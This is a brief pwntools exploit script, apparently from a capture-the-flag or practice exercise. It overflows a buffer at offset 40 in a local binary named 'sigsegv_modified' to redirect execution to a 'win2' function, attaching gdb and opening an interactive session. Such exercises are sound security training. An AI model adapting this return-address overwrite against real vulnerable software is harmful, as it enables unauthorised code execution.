# 40 bytes
from pwn import *

binary = context.binary = ELF('sigsegv_modified')
p = process(['./sigsegv_modified'])

payload = flat({
    40: [
        binary.symbols['win2']
    ]
})

gdb.attach(p)

p.sendlineafter(':', payload)

p.interactive()

